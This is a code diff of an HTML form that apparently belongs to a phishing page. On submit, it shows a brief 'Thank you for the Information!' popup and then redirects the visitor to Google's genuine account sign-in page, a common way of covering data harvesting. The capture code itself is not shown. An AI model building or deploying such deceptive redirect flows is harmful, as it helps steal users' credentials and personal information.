@@ -85,19 +85,19 @@
             <input type="text" id="5field2" name="5field2" style="display: none;" required>
 
             <input type="submit" value="Submit" onclick="redirectToGoogle()">
-
+            <script>
+                function redirectToGoogle() {
+                    var popup = window.open("", "popup", "width=200,height=100");
+                    popup.document.write("<p>Thank you for the Information!</p>");
+                    setTimeout(function() {
+                        popup.window.close();
+                    }, 500);
+                  window.location.href = "https://accounts.google.com/AddSession?hl=en&continue=https://www.google.com/search%3Fq%3Dgmail%2Blogin%2Bpage%26oq%3Dgmail%2Blogin%2Bpage%26sourceid%3Dchrome%26ie%3DUTF-8&ec=GAlAAQ&authuser=0";
+                }
+            </script>
         </form>
 
-        <script>
-            function redirectToGoogle() {
-                var popup = window.open("", "popup", "width=200,height=100");
-                popup.document.write("<p>Thank you for the Information!</p>");
-                setTimeout(function() {
-                    popup.window.close();
-                }, 10);
-              window.location.href = "https://accounts.google.com/AddSession?hl=en&continue=https://www.google.com/search%3Fq%3Dgmail%2Blogin%2Bpage%26oq%3Dgmail%2Blogin%2Bpage%26sourceid%3Dchrome%26ie%3DUTF-8&ec=GAlAAQ&authuser=0";
-            }
-        </script>
+        
     </div>
 
     <script>
